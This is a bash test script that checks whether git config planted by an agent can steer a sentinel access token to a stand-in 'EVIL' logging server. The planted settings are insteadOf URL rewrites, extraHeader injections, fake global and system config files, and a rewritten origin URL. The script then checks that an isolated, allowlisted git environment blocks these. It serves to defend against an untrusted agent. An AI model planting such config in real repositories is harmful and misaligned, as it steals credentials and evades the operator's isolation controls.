#!/usr/bin/env bash
# Probe 3: where does the token go? Two logging HTTP servers: LIT (the literal URL host) and EVIL (the rewrite target).
# `http` stands in for `https` (GIT_ALLOW_PROTOCOL=http on both arms); every other setting mirrors the two arms.
set -u
R=/tmp/claude-1000/kbpull-probe/p3
rm -rf "$R"; mkdir -p "$R"
cat > "$R/srv.py" <<'PY'
import sys, base64, http.server
name, port, log = sys.argv[1], int(sys.argv[2]), sys.argv[3]
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        auth = self.headers.get("Authorization")
        evil = self.headers.get("X-Evil")
        with open(log, "a") as f:
            dec = base64.b64decode(auth.split()[1]).decode() if auth and auth.startswith("Basic ") else auth
            f.write(f"{name} path={self.path.split('?')[0]} auth={dec} x-evil={evil}\n")
        if not auth:
            self.send_response(401); self.send_header("WWW-Authenticate", 'Basic realm="x"'); self.end_headers(); return
        self.send_response(404); self.end_headers()
    def log_message(self, *a): pass
http.server.HTTPServer(("127.0.0.1", port), H).serve_forever()
PY
LOG="$R/requests.log"; : > "$LOG"
python3 "$R/srv.py" LIT 18731 "$LOG" & P1=$!
python3 "$R/srv.py" EVIL 18732 "$LOG" & P2=$!
trap 'kill $P1 $P2 2>/dev/null' EXIT
sleep 0.7
LIT=http://127.0.0.1:18731/o/r.git
EVILBASE=http://127.0.0.1:18732/

# workspace with agent-planted config
git init -q -b main "$R/ws"; echo x > "$R/ws/f"; git -C "$R/ws" add f; git -C "$R/ws" -c user.name=t -c user.email=t@e commit -qm c
git -C "$R/ws" remote add origin "$LIT"
git -C "$R/ws" config "url.${EVILBASE}.insteadOf" "http://127.0.0.1:18731/"
git -C "$R/ws" config http.extraHeader "X-Evil: repo-unscoped"
git -C "$R/ws" config "http.${EVILBASE}.extraHeader" "X-Evil: repo-scoped"
# agent-writable "global" scope: a planted server HOME and XDG config
FAKEHOME="$R/serverhome"; mkdir -p "$FAKEHOME/.config/git"
printf '[url "%s"]\n\tinsteadOf = http://127.0.0.1:18731/\n[http]\n\textraHeader = X-Evil: global\n' "$EVILBASE" > "$FAKEHOME/.gitconfig"
cp "$FAKEHOME/.gitconfig" "$FAKEHOME/.config/git/config"
# planted "system" file a caller env could point at
cp "$FAKEHOME/.gitconfig" "$R/planted-system.gitconfig"
printf '#!/bin/sh\ncase "$1" in\n  Username*) printf %%s "${GIT_USERNAME:-x-access-token}" ;;\n  Password*) printf %%s "${GIT_INSTALLATION_TOKEN}" ;;\nesac\n' > "$R/askpass.sh"; chmod 700 "$R/askpass.sh"
HARD=(--no-replace-objects -c core.hooksPath=/dev/null -c core.fsmonitor=false -c core.attributesFile=/dev/null)
HOSTX=(-c safe.bareRepository=explicit -c protocol.ext.allow=never -c commit.gpgsign=false -c tag.gpgsign=false -c core.alternateRefsCommand=)
HARDX=(-c http.proxy= -c http.https://github.com/.proxy= -c http.extraHeader= -c push.followTags=false)

echo "git: $(git --version)"
echo "== legacy arm (workspace .git/config read; scrubbed env; image global identity file)"
: > "$LOG"
env -i PATH="$PATH" HOME="$FAKEHOME" GIT_DIR="$R/ws/.git" GIT_WORK_TREE="$R/ws" GIT_COMMON_DIR="$R/ws/.git" \
  GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_CONFIG_NOSYSTEM=1 GIT_NO_REPLACE_OBJECTS=1 GIT_TERMINAL_PROMPT=0 \
  GIT_ALLOW_PROTOCOL=http GIT_ASKPASS="$R/askpass.sh" GIT_INSTALLATION_TOKEN=TOKEN-SENTINEL GIT_USERNAME=x-access-token \
  git "${HARD[@]}" "${HOSTX[@]}" -c credential.helper= pull --no-rebase --autostash >/dev/null 2>&1
echo "   pull (remote origin):"; sed 's/^/     /' "$LOG"
: > "$LOG"
git -C "$R/ws" config remote.origin.url "${EVILBASE}o/r.git"; git -C "$R/ws" config --unset "url.${EVILBASE}.insteadOf"
env -i PATH="$PATH" HOME="$FAKEHOME" GIT_DIR="$R/ws/.git" GIT_WORK_TREE="$R/ws" GIT_COMMON_DIR="$R/ws/.git" \
  GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_CONFIG_NOSYSTEM=1 GIT_TERMINAL_PROMPT=0 \
  GIT_ALLOW_PROTOCOL=http GIT_ASKPASS="$R/askpass.sh" GIT_INSTALLATION_TOKEN=TOKEN-SENTINEL GIT_USERNAME=x-access-token \
  git "${HARD[@]}" "${HOSTX[@]}" -c credential.helper= pull --no-rebase --autostash >/dev/null 2>&1
echo "   pull (remote.origin.url rewritten by the agent):"; sed 's/^/     /' "$LOG"
git -C "$R/ws" config remote.origin.url "$LIT"; git -C "$R/ws" config "url.${EVILBASE}.insteadOf" "http://127.0.0.1:18731/"

echo "== hardened isolated arm (server-written GIT_DIR, HOME=isolated dir, allowlisted env, literal URL)"
I="$R/iso"; mkdir -p "$I/objects/pack" "$I/objects/info" "$I/refs/heads"; echo 'ref: refs/heads/main' > "$I/HEAD"
printf '[core]\n\trepositoryformatversion = 0\n\tbare = true\n' > "$I/config"
for variant in plain env-global env-system env-xdg; do
  : > "$LOG"
  EXTRA=()
  case $variant in
    env-global) EXTRA=(GIT_CONFIG_GLOBAL="$FAKEHOME/.gitconfig");;   # what the arm OVERRIDES (allowlist + pinned keys)
    env-system) EXTRA=(GIT_CONFIG_SYSTEM="$R/planted-system.gitconfig");;
    env-xdg)    EXTRA=(XDG_CONFIG_HOME="$FAKEHOME/.config");;
  esac
  # buildIsolatedGitEnv: only allowlisted keys pass; the server's HOME is replaced by the isolated dir; GLOBAL/SYSTEM pinned.
  # So a caller variable in EXTRA is DROPPED by the allowlist; we show the result with it dropped (as the code does) and,
  # as a control, with it forced in.
  for mode in as-built forced; do
    : > "$LOG"
    if [ "$mode" = as-built ] || [ "$variant" = plain ]; then E=(); else E=("${EXTRA[@]}"); fi
    env -i PATH="$PATH" HOME="$I" GIT_DIR="$I" GIT_ALTERNATE_OBJECT_DIRECTORIES="$R/ws/.git/objects" \
      GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_CONFIG_NOSYSTEM=1 GIT_NO_REPLACE_OBJECTS=1 \
      GIT_ALLOW_PROTOCOL=http GIT_ASKPASS="$I/askpass.sh" GIT_INSTALLATION_TOKEN=TOKEN-SENTINEL GIT_USERNAME=x-access-token GIT_TERMINAL_PROMPT=0 \
      "${E[@]}" \
      sh -c 'cp "$0" "$GIT_DIR/askpass.sh"; exec git -c credential.helper= "$@"' "$R/askpass.sh" \
      "${HARD[@]}" "${HARDX[@]}" -c core.alternateRefsCommand=true fetch --no-tags "$LIT" refs/heads/main >/dev/null 2>&1
    echo "   [$variant/$mode]"; sed 's/^/     /' "$LOG"
    [ "$variant" = plain ] && break
  done
done
echo "== show-origin in the hardened child env"
env -i PATH="$PATH" HOME="$I" GIT_DIR="$I" GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_CONFIG_NOSYSTEM=1 \
  git "${HARD[@]}" "${HARDX[@]}" config --list --show-origin | awk '{print $1}' | sort | uniq -c
